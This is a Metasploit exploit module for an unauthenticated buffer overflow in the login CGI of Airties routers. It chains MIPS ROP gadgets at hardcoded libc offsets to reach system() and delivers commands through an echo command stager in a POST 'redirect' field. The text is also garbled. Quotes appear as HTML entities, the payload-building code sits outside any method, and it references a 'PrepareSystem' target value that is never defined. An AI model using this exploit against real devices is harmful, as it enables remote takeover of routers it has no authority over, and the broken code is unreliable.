# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Airties login-cgi Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote buffer overflow vulnerability on several Airties routers.
        The vulnerability exists in the handling of HTTP queries to the login cgi with long
        redirect parametres. The vulnerability doesn&#039;t require authentication. This module has
        been tested successfully on the AirTies_Air5650v3TT_FW_1.0.2.0.bin firmware with emulation.
        Other versions such as the Air6372, Air5760, Air5750, Air5650TT, Air5453, Air5444TT,
        Air5443, Air5442, Air5343, Air5342, Air5341, Air5021 are also reported as vulnerable.
      },
      &#039;Author&#039;         =>
        [
          &#039;Batuhan Burakcin <batuhan[at]bmicrosystems.com>&#039;, # discovered the vulnerability
          &#039;Michael Messner <devnull[at]s3cur1ty.de>&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           => ARCH_MIPSBE,
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;36577&#039;],
          [&#039;URL&#039;, &#039;http://www.bmicrosystems.com/blog/exploiting-the-airties-air-series/&#039;], #advisory
          [&#039;URL&#039;, &#039;http://www.bmicrosystems.com/exploits/airties5650tt.txt&#039;] #PoC
        ],
      &#039;Targets&#039;        =>
        [
          [ &#039;AirTies_Air5650v3TT_FW_1.0.2.0&#039;,
            {
              &#039;Offset&#039;         => 359,
              &#039;LibcBase&#039;       => 0x2aad1000,
              &#039;RestoreReg&#039;     => 0x0003FE20, # restore s-registers
              &#039;System&#039;         => 0x0003edff, # address of system-1
              &#039;CalcSystem&#039;     => 0x000111EC, # calculate the correct address of system
              &#039;CallSystem&#039;     => 0x00041C10, # call our system
            }
          ]
        ],
      &#039;DisclosureDate&#039;  => &#039;Mar 31 2015&#039;,
      &#039;DefaultTarget&#039;   => 0))
 
      deregister_options(&#039;CMDSTAGER::DECODER&#039;, &#039;CMDSTAGER::FLAVOUR&#039;)
  end
 
  def check
    begin
      res = send_request_cgi({
        &#039;uri&#039;     => &#039;/cgi-bin/login&#039;,
        &#039;method&#039;  => &#039;GET&#039;
      })
 
      if res && [200, 301, 302].include?(res.code) && res.body.to_s =~ /login.html\?ErrorCode=2/
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end
 
    Exploit::CheckCode::Unknown
  end
 
  def exploit
    print_status("#{peer} - Accessing the vulnerable URL...")
 
    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable URL")
    end
 
    print_status("#{peer} - Exploiting...")
    execute_cmdstager(
      :flavour  => :echo,
      :linemax => 100
    )
  end
 
    shellcode = rand_text_alpha_upper(target[&#039;Offset&#039;])                    # padding
    shellcode << [target[&#039;LibcBase&#039;] + target[&#039;RestoreReg&#039;]].pack("N")     # restore registers with controlled values
 
                 # 0003FE20                 lw      $ra, 0x48+var_4($sp)
                 # 0003FE24                 lw      $s7, 0x48+var_8($sp)
                 # 0003FE28                 lw      $s6, 0x48+var_C($sp)
                 # 0003FE2C                 lw      $s5, 0x48+var_10($sp)
                 # 0003FE30                 lw      $s4, 0x48+var_14($sp)
                 # 0003FE34                 lw      $s3, 0x48+var_18($sp)
                 # 0003FE38                 lw      $s2, 0x48+var_1C($sp)
                 # 0003FE3C                 lw      $s1, 0x48+var_20($sp)
                 # 0003FE40                 lw      $s0, 0x48+var_24($sp)
                 # 0003FE44                 jr      $ra
                 # 0003FE48                 addiu   $sp, 0x48
 
    shellcode << rand_text_alpha_upper(36)                                 # padding
    shellcode << [target[&#039;LibcBase&#039;] + target[&#039;System&#039;]].pack(&#039;N&#039;)         # s0 - system address-1
    shellcode << rand_text_alpha_upper(16)                                 # unused registers $s1 - $s4
    shellcode << [target[&#039;LibcBase&#039;] + target[&#039;CallSystem&#039;]].pack(&#039;N&#039;)     # $s5 - call system
 
                 # 00041C10                 move    $t9, $s0
                 # 00041C14                 jalr    $t9
                 # 00041C18                 nop
 
    shellcode << rand_text_alpha_upper(8)                                  # unused registers $s6 - $s7
    shellcode << [target[&#039;LibcBase&#039;] + target[&#039;PrepareSystem&#039;]].pack(&#039;N&#039;)  # write sp to $a0 -> parametre for call to system
 
                 # 000215B8                 addiu   $a0, $sp, 0x20
                 # 000215BC                 lw      $ra, 0x1C($sp)
                 # 000215C0                 jr      $ra
                 # 000215C4                 addiu   $sp, 0x20
 
    shellcode << rand_text_alpha_upper(28)                                 # padding
    shellcode << [target[&#039;LibcBase&#039;] + target[&#039;CalcSystem&#039;]].pack(&#039;N&#039;)     # add 1 to s0 (calculate system address)
 
                 # 000111EC                 move    $t9, $s5
                 # 000111F0                 jalr    $t9
                 # 000111F4                 addiu   $s0, 1
 
    shellcode << cmd
  end
 
  def execute_command(cmd, opts)
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039;     => &#039;/cgi-bin/login&#039;,
        &#039;encode_params&#039; => false,
        &#039;vars_post&#039; => {
          &#039;redirect&#039; => shellcode,
          &#039;user&#039;     => rand_text_alpha(5),
          &#039;password&#039; => rand_text_alpha(8)
        }
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end

